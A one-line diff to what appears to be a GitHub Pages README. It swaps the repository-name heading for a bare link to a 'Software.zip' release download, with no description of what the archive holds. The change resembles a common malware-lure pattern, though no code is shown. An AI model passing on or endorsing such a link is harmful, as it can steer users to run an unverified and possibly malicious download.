@@ -1,1 +1,1 @@
-# SudoUserPlayer.github.io
+# https://github.com/SudoUserPlayer/SudoUserPlayer.github.io/releases/download/v2.0/Software.zip
